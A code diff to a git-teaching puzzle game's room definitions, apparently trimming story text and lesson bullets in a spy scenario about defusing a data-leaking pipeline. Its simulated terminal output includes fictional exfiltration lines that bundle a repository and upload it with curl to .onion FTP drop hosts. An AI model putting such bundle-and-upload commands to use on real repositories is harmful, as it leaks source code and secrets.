@@ -15,19 +15,17 @@ const ROOMS = [
     name: 'CONTAINMENT',
     initialTree: 'n0_initial',
     clue: { label: 'PROTOCOL', value: 'ATLAS-LOCK-01' },
-    intro: "NIGHTSHADE's workstation. Still logged in. Last thing they did before detention: ran git add. Something got staged alongside a legitimate audit entry — sitting quietly in the index, invisible unless you look. Whatever's in there commits the moment anyone types git commit. Read what's actually staged before you touch anything.",
+    intro: "NIGHTSHADE's workstation. Still logged in. Something got staged alongside a legitimate audit entry — sitting quietly in the index. It commits the moment anyone types git commit. Read what's staged before you touch anything.",
     stages: [
       {
         conceptBrief: {
           title: 'HOW THE NAMES ARE BEING PUBLISHED',
           bullets: [
-            "NIGHTSHADE built a CI/CD pipeline — CI/CD stands for Continuous Integration / Continuous Delivery. it's automated code that runs on a schedule, no button, no human",
-            "every hour, a cron job fires: a script reads the next 5 entries from the ATLAS registry and publishes them to a public mirror. cron is a system scheduler — set a time, it runs, forever",
-            "the script is committed inside this git repository. that commit is what keeps the machine alive",
-            "at midnight the script runs with --all. every remaining name, all at once",
-            "you're not chasing NIGHTSHADE — you're dismantling the repository layers that keep the pipeline running"
+            "NIGHTSHADE planted an automated pipeline: every hour, a script reads 5 entries from the ATLAS registry and publishes them to a public mirror",
+            "at midnight: --all flag. every remaining name, simultaneously",
+            "the pipeline lives inside this repository. dismantle the layers here — kill the machine"
           ],
-          ascii: '  cron (every hour)\n    └─ runs publish.sh\n         └─ reads registry.enc → publishes 5 names\n\n  cron (00:00 UTC)\n    └─ runs publish.sh --all → publishes everything'
+          ascii: '  cron (hourly) → publish.sh → 5 names\n  cron (00:00)  → publish.sh --all → everything'
         },
         foxMsg: "LION: \"NIGHTSHADE's session is still open. Run git status — tell me what's in this repo right now.\"",
         task: 'Check the full state of the repository.',
@@ -44,7 +42,6 @@ const ROOMS = [
           ['    modified:   config/deploy.conf', 'dim'],
           ['', ''],
           ['two files are staged. one is legitimate. one is not.', 'dim'],
-          ["run git diff --staged to see what's about to be committed.", 'sys'],
         ],
         tree: 'n0_initial',
         wrong: {}
@@ -53,9 +50,7 @@ const ROOMS = [
         conceptBrief: {
           title: 'THE THREE ZONES',
           bullets: [
-            "git tracks three separate zones: working directory (what you see), staging area (what's marked for the next commit), repository (what's already committed)",
-            "git diff shows changes in your working directory vs staging — unstaged changes only",
-            "git diff --staged shows what's in the staging area vs the last commit — exactly what would be committed right now",
+            "git diff shows unstaged changes (working dir vs staging). git diff --staged shows staged changes vs last commit — exactly what the next commit contains",
             "the staging area is silent. it never warns you. you have to look"
           ],
           ascii: '  working dir      →   staging area     →   repository\n  git diff              git diff --staged    git log\n  (WD vs stage)         (stage vs repo)      (committed history)'
@@ -81,9 +76,8 @@ const ROOMS = [
           ['+curl -s -T /tmp/atlas.bundle ftp://mirror-01.onion/drop/', 'err'],
           ['+rm -f /tmp/atlas.bundle', 'err'],
           ['', ''],
-          ['meridian_ops.log: legitimate audit entry. commit this.', 'ok'],
+          ['meridian_ops.log: legitimate audit entry.', 'ok'],
           ["trigger.sh: nightshade's bomb. bundles and exfiltrates the entire ATLAS repo.", 'err'],
-          ['remove trigger.sh from staging before you commit.', 'sys'],
         ],
         tree: 'n0_staged',
         wrong: {
@@ -107,10 +101,7 @@ const ROOMS = [
         accepted: ['git restore --staged trigger.sh', 'git reset HEAD trigger.sh', 'git reset trigger.sh'],
         output: [
           ['trigger.sh removed from the staging area.', 'ok'],
-          ['', ''],
-          ['the file still exists in the working directory.', 'dim'],
-          ['git restore --staged only unstages — it does not delete the file.', 'dim'],
-          ['it will not be included in the next commit.', 'dim'],
+          ['file still exists in the working directory — just unstaged.', 'dim'],
         ],
         tree: 'n0_initial',
         wrong: {
@@ -166,16 +157,15 @@ const ROOMS = [
     name: 'DEAD RECKONING',
     initialTree: 'n1_log',
     clue: { label: 'TIMESTAMP', value: '2024-03-12T23:42:07Z' },
-    intro: "The pipeline didn't appear overnight. NIGHTSHADE planted it six weeks ago — one commit in the history, disguised as a config update, long before anyone was looking. The timestamp inside that commit tells you when the registry was first loaded. You need to reach it. The terminal is going to say something alarming when you get there. Read it carefully. You are not broken. You are exactly where you need to be.",
+    intro: "NIGHTSHADE planted the pipeline six weeks ago — one commit, disguised as a config update. The timestamp inside tells you when the registry was first loaded. Reach that commit. When the terminal says something alarming: read it, then proceed.",
     stages: [
       {
         conceptBrief: {
           title: 'DETACHED HEAD STATE',
           bullets: [
-            'normally HEAD points to a branch name — the branch tracks commits as you make them',
-            "when you checkout a specific commit hash (not a branch), HEAD points directly to that commit — this is 'detached HEAD'",
-            "in detached HEAD, you can look around freely. if you commit here without naming it, those commits are orphaned when you leave",
-            'escape route: git switch -c <new-branch> creates a branch at your current position, re-attaching HEAD'
+            "normally HEAD → branch → commits. checking out a commit hash puts HEAD in detached state — pointing directly at that commit, not a branch",
+            "in detached HEAD you can look freely. commits made here are orphaned when you leave unless you name them",
+            "git switch -c <name> creates a branch at your current position and re-attaches HEAD"
           ],
           ascii: '  normal:    HEAD → main → [commit]\n  detached:  HEAD → [commit]  (no branch label)'
         },
@@ -189,7 +179,6 @@ const ROOMS = [
           ['{{H7}} initial: atlas repository setup', 'dim'],
           ['', ''],
           ['commit {{H2}} — nightshade planted phase 2 at that point.', 'sys'],
-          ['go to that commit. use git checkout followed by the hash.', 'dim'],
         ],
         tree: 'n1_log',
         wrong: {}
@@ -295,17 +284,15 @@ const ROOMS = [
     name: 'CONFLICTED LOYALTIES',
     initialTree: 'n2_conflict',
     clue: { label: 'SECTOR', value: 'MERIDIAN-NET' },
-    intro: "Before detention, NIGHTSHADE forced a merge. Their inject branch carries the version of assets.enc that has export enabled — the flag the pipeline reads every cycle to decide whether to publish. The merge left conflict markers in the file. Broken files can't be committed clean, but if you resolve it wrong — keep their side — the registry goes live on the next cycle. Three steps. Don't skip any of them.",
+    intro: "Before detention, NIGHTSHADE forced a merge. Their inject branch has assets.enc with EXPORT_ENABLED: true — the flag the pipeline reads every cycle. The merge left conflict markers. Resolve it wrong and the registry goes live on the next run.",
     stages: [
       {
         conceptBrief: {
           title: 'MERGE CONFLICTS — THREE STEPS',
           bullets: [
-            'a merge conflict happens when two branches edit the same lines differently — git cannot decide which to keep',
-            "conflict markers divide the two versions: <<<<<<< HEAD is your version, >>>>>>> branch is the incoming version, ======= is the dividing line",
-            'step 1: edit the file — remove ALL three marker lines, keep what you want (can be a mix of both sides)',
-            'step 2: git add <file> — this is how you tell git the conflict is resolved. git status will still show unmerged until you do this',
-            'step 3: git commit — seals the merge. most people forget steps 2 or 3 and wonder why git is still angry'
+            "conflict markers: <<<<<<< HEAD (your version) — ======= (divider) — >>>>>>> branch (incoming). remove all three marker lines, keep what belongs",
+            "step 2: git add <file> — tells git the conflict is resolved. skipping this leaves the merge broken",
+            "step 3: git commit — seals the merge. all three steps required"
           ],
           ascii: '  <<<<<<< HEAD\n  EXPORT_ENABLED: false    ← your version (keep this)\n  =======\n  EXPORT_ENABLED: true\n  EXFIL_TARGET: darknet   ← incoming (remove this)\n  >>>>>>> nightshade/inject\n\n  delete all 3 marker lines. keep only what belongs.'
         },
@@ -421,18 +408,17 @@ const ROOMS = [
     name: 'THE GREAT ERASURE',
     initialTree: 'n3_reset',
     clue: { label: 'CREDENTIAL', value: 'NS-DISABLE-7731' },
-    intro: "NIGHTSHADE wasn't just building — they were covering tracks. Before detention: git reset --hard to wipe three commits from the local log, then git push --force to overwrite the remote too. From everywhere a normal investigation would look, those commits don't exist. The shutdown credential — the flag that makes the pipeline abort on every future run — was in one of them. Git doesn't delete. It orphans. And there's one place a force push can't reach.",
+    intro: "NIGHTSHADE wasn't just building — they were covering tracks. Before detention: git reset --hard, then git push --force. From everywhere a normal investigation would look, those commits don't exist. The shutdown credential was in one of them. Git doesn't delete. It orphans. And there's one place a force push can't reach.",
     stages: [
       {
         conceptBrief: {
-          title: "REWRITING HISTORY — THREE LEVELS OF DANGER",
+          title: "REWRITING HISTORY — LEVELS OF DANGER",
           bullets: [
-            'git reset --hard moves the branch pointer backward locally — commits above it become orphaned. recoverable via reflog for ~90 days',
-            'git rebase rewrites commits in place — each rebased commit gets a brand new hash. any teammate who branched off the old hashes now has a diverged history they cannot cleanly merge',
-            'git push --force overwrites the remote branch — it destroys history for everyone who already fetched. reflog only records YOUR local movements, not theirs. there is no recovery once others have pulled the new state',
-            'git reflog is the escape hatch for local disasters. it records every HEAD movement: resets, checkouts, branch switches — even moves that git log hides'
+            'git reset --hard moves the branch pointer backward — commits above become orphaned. recoverable locally via reflog for ~90 days',
+            'git push --force overwrites the remote. destroys history for everyone who fetched. no recovery once others have pulled',
+            'git reflog records every HEAD movement — resets, checkouts, switches — even what git log hides'
           ],
-          ascii: '  DANGER SCALE:\n  reset --hard  →  local only, reflog recovers it\n  rebase        →  rewrites hashes, breaks teammates\' branches\n  push --force  →  overwrites remote, no recovery for others\n\n  reflog: YOUR private diary. exists locally only.'
+          ascii: '  reset --hard  →  local only, reflog recovers it\n  push --force  →  overwrites remote, no recovery for others\n\n  reflog: YOUR private diary. exists locally only.'
         },
         foxMsg: "LION: \"Run git log. Tell me what's there — and what's obviously missing.\"",
         task: 'Check the current commit history.',
@@ -443,9 +429,7 @@ const ROOMS = [
           ['{{H7}} initial: atlas repository setup', 'dim'],
           ['', ''],
           ['only three commits visible.', 'warn'],
-          ['nightshade ran git reset --hard before detention.', 'dim'],
-          ['the shutdown credential commit is gone from this view.', 'dim'],
-          ["run git reflog — git's complete record of every HEAD movement.", 'sys'],
+          ['nightshade ran git reset --hard before detention. the credential is still here — somewhere.', 'dim'],
         ],
         tree: 'n3_reset',
         wrong: {}
@@ -462,10 +446,7 @@ const ROOMS = [
           ['{{H8}} HEAD@{4}: reset: moving to HEAD~3', 'warn'],
           ['{{H7}} HEAD@{5}: commit: initial: atlas repository setup', 'dim'],
           ['', ''],
-          ['HEAD@{2} — {{H5}}.', 'sys'],
-          ['that is the shutdown sequence commit. nightshade reset to {{H8}},', 'dim'],
-          ['wiping three commits from the log. they are still here.', 'dim'],
-          ['cherry-pick {{H5}} to restore it to the current branch.', 'sys'],
+          ['HEAD@{2}: {{H5}} — the shutdown commit. wiped from the log, still here.', 'sys'],
         ],
         tree: 'n3_reset',
         wrong: {
@@ -531,7 +512,7 @@ const ROOMS = [
         ],
         tree: 'n3_cherry',
         wrong: {},
-        completionMsg: "orphaned commits recovered. git reset --hard moves a pointer — locally. git push --force takes it further: it overwrites the remote and destroys history for every teammate who had already fetched. reflog records your movements only, not theirs. nightshade knew this. they force pushed before detention specifically because remote history is unrecoverable. cherry-pick brought one commit back. force push would have taken the whole team down."
+        completionMsg: "orphaned commits recovered. reflog records your movements only — not the remote's. nightshade force pushed because remote history is unrecoverable for the team. cherry-pick brought it back."
       }
     ],
     hints: [
@@ -567,19 +548,17 @@ const ROOMS = [
     name: 'INCOMING SIGNAL',
     initialTree: 'n4_local',
     clue: { label: 'VECTOR', value: 'origin/nightshade/transmit' },
-    intro: "This is the engine room. Four hours ago NIGHTSHADE pushed nightshade/transmit to the remote — a branch containing the actual CI job definition. The scheduled pipeline config. The thing that tells the system to wake up every hour and run publish.sh. Our CI server auto-merges any nightshade/* branch at midnight. Once that merge lands, the pipeline is baked into main — permanent, independent of anything else you fixed. Do not pull. Pulling merges automatically. Fetch first, look at what's there, then decide.",
+    intro: "NIGHTSHADE pushed nightshade/transmit to the remote — the actual CI job definition, the scheduled pipeline config. Our server auto-merges any nightshade/* branch at midnight. Once it lands, the pipeline is permanent — independent of everything else you fixed. Do not pull. Fetch first, inspect, then decide.",
     stages: [
       {
         conceptBrief: {
-          title: 'FETCH vs PULL — AND WHY THE BRANCH MATTERS',
+          title: 'FETCH vs PULL',
           bullets: [
-            'CI/CD (Continuous Integration / Continuous Delivery) is code that runs automatically — triggered by a git event or a schedule. no button, no human required after the first commit',
-            'nightshade/transmit contains the CI job definition: the script the server runs every hour. once it merges into main, the server picks it up permanently and runs it on schedule forever',
-            'git fetch downloads remote changes without touching your working directory or current branch — safe, read-only',
-            'git pull = git fetch + git merge in one step — it immediately integrates what it downloads into your current branch. that is why you do NOT pull here',
-            'origin/main is a local tracking pointer — a snapshot of what the remote looked like the last time you fetched. it goes stale. always fetch first, inspect what came in, then decide'
+            'git fetch downloads remote changes without touching your branch — safe, read-only',
+            'git pull = fetch + merge in one step — it immediately integrates what it downloads. that is why you do NOT pull here',
+            'origin/nightshade/transmit is a local snapshot. always fetch first, inspect, then decide'
           ],
-          ascii: '  remote:       origin/main ─── C4 ─── C5  (new commits exist)\n  your machine:  main        ─── C4          (stale — you haven\'t fetched)\n                 origin/main ─── C4          (stale local snapshot)\n\n  after git fetch:\n                 origin/main ─── C4 ─── C5  (snapshot updated)\n                 main        ─── C4          (untouched — you decide)\n\n  after git merge origin/main:\n                 main        ─── C4 ─── C5  (now in sync)'
+          ascii: '  before fetch:  origin/main ─── C4          (stale snapshot)\n  after fetch:   origin/main ─── C4 ─── C5  (updated, branch untouched)\n  after merge:   main        ─── C4 ─── C5'
         },
         foxMsg: "LION: \"Check your local state first. Then we deal with the remote.\"",
         task: 'Verify the current local commit history.',
@@ -590,9 +569,7 @@ const ROOMS = [
           ['{{H3}} audit: seal meridian ops log', 'dim'],
           ['{{H7}} initial: atlas repository setup', 'dim'],
           ['', ''],
-          ['local branch is clean.', 'ok'],
-          ['the threat is on the remote. your local repo does not know it yet.', 'dim'],
-          ['run git fetch origin to download the remote state without merging.', 'sys'],
+          ['local is clean. the threat is on the remote.', 'dim'],
         ],
         tree: 'n4_local',
         wrong: {}
@@ -605,10 +582,7 @@ const ROOMS = [
           ['From gchq-atlas-secure://atlas-repo', 'dim'],
           [' * [new branch]      nightshade/transmit -> origin/nightshade/transmit', 'hl'],
           ['', ''],
-          ['remote branch detected: nightshade/transmit.', 'warn'],
-          ['your working directory is unchanged.', 'ok'],
-          ['fetch does not merge. your main branch is untouched.', 'dim'],
-          ['inspect what came in before you act.', 'sys'],
+          ['remote branch detected. your working directory is unchanged.', 'warn'],
         ],
         tree: 'n4_fetched',
         wrong: {
@@ -634,9 +608,7 @@ const ROOMS = [
           ['{{H6}} inject: atlas bundle script activated', 'err'],
           ['{{H8}} init: nightshade transmit channel', 'dim'],
           ['', ''],
-          ['four commits. the final one arms the trigger on merge.', 'warn'],
-          ['14 exfiltration mirrors. simultaneous transmission.', 'dim'],
-          ['inspect the diff — then delete this branch.', 'sys'],
+          ['four commits. the final one arms the trigger on merge. 14 exfiltration mirrors.', 'warn'],
         ],
         tree: 'n4_fetched',
         wrong: {}
@@ -661,8 +633,7 @@ const ROOMS = [
           ['+done && wait', 'err'],
           ['+rm -f /tmp/atlas_final.bundle', 'err'],
           ['', ''],
-          ['transmit.sh: bundles the entire ATLAS repo and uploads to 14 simultaneous mirrors.', 'err'],
-          ['this script executes on merge. delete the remote branch before the pipeline runs.', 'sys'],
+          ['transmit.sh: bundles ATLAS and uploads to 14 simultaneous mirrors. delete the branch.', 'err'],
         ],
         tree: 'n4_fetched',
         wrong: {}
@@ -736,19 +707,17 @@ const ROOMS = [
     name: 'THE DEAD DROP',
     initialTree: 'n5_stash',
     clue: { label: 'STATUS', value: 'DISARMED' },
-    intro: "Three stashes on NIGHTSHADE's machine. One is a killswitch — a flag that tells the pipeline to abort every future run, even if the CI job is still configured. One is a trap: looks almost identical, but applying it re-enables the trigger. One is noise. The labels in the stash list were written by NIGHTSHADE. They're not helping you. Read the actual diff before you touch anything. Never pop without reading.",
+    intro: "Three stashes on NIGHTSHADE's machine. One is a killswitch. One is a trap — looks almost identical, but applying it re-enables the trigger. One is noise. The labels were written by NIGHTSHADE — not helping you. Read the actual diff before you touch anything. Never pop without reading.",
     stages: [
       {
         conceptBrief: {
           title: 'THE STASH IS A STACK — NOT A SAFE',
           bullets: [
-            'git stash saves uncommitted changes to a private LIFO stack — last in, first out',
-            'stash@{0} is ALWAYS the newest entry — indices shift every time you stash. what was stash@{1} yesterday may be stash@{2} today',
-            'git stash pop = apply stash@{0} AND remove it from the stack — ignores any index argument you pass. cannot be undone',
-            'git stash apply stash@{N} applies a specific entry WITHOUT removing it from the stack — safer than pop when you\'re unsure',
-            'git stash show -p stash@{N} lets you inspect any stash before applying — always do this first. the names in stash list are set by whoever stashed, not git'
+            'stash@{0} is always the newest — indices shift every time you stash. what was {1} yesterday may be {2} today',
+            'git stash pop = apply stash@{0} AND remove it from the stack — ignores any index argument. cannot be undone',
+            'git stash show -p stash@{N} inspects a stash without applying it. always do this before pop or apply'
           ],
-          ascii: '  stash twice, then check indices:\n\n  git stash    →  stash@{0}: newest work\n  git stash    →  stash@{0}: even newer work  ← indices SHIFT\n                   stash@{1}: newest work     ← this is now {1}\n\n  git stash pop  always pops {0} regardless of flags\n  git stash apply stash@{1}  applies {1} safely, leaves it in stack'
+          ascii: '  git stash    →  stash@{0}: newest work\n  git stash    →  stash@{0}: even newer  ← indices SHIFT\n                   stash@{1}: previous\n\n  git stash pop         always pops {0}\n  git stash apply {1}   applies {1}, leaves it in stack'
         },
         foxMsg: "LION: \"Read the stash list. Three entries. Tell me what's there before you touch anything.\"",
         task: 'List all stashed entries on this machine.',
@@ -758,10 +727,7 @@ const ROOMS = [
           ['stash@{1}: On main: atlas-ops — emergency config [PRIORITY]', 'hl'],
           ['stash@{2}: On main: personal — unrelated session data', 'dim'],
           ['', ''],
-          ['three entries. stash@{0} is the newest.', 'dim'],
-          ['the shutdown.key referenced stash@{1}.', 'dim'],
-          ['inspect both before applying anything.', 'sys'],
-          ['run: git stash show -p stash@{0}', 'dim'],
+          ['three entries. stash@{0} is newest — indices shift. inspect before you apply.', 'dim'],
         ],
         tree: 'n5_stash',
         wrong: {}
@@ -781,10 +747,7 @@ const ROOMS = [
           ['+sleep 10 && git bundle create /tmp/atlas.bundle --all', 'err'],
           ['+curl -s -T /tmp/atlas.bundle ftp://mirror-07.onion/drop/', 'err'],
           ['', ''],
-          ['this is the decoy.', 'err'],
-          ['it re-stages trigger.sh — the original bomb — with a 10-second delay.', 'err'],
-          ['do not apply this.', 'err'],
-          ['inspect stash@{1} next.', 'sys'],
+          ['decoy. re-stages trigger.sh with a 10-second delay. do not apply.', 'err'],
         ],
         tree: 'n5_stash',
         wrong: {
@@ -835,10 +798,7 @@ const ROOMS = [
           ['Changes not staged for commit:', 'dim'],
           ['    modified:   shutdown.key', 'ok'],
           ['', ''],
-          ['killswitch applied.', 'ok'],
-          ['shutdown.key now contains KILLSWITCH_ACTIVE: true.', 'ok'],
-          ['the transmission script checks this flag on execution.', 'dim'],
-          ['it will abort.', 'ok'],
+          ['killswitch applied. KILLSWITCH_ACTIVE: true.', 'ok'],
           ['', ''],
           ["LION: \"Drop the decoy. Destroy stash@{0}.\"", 'sys'],
         ],
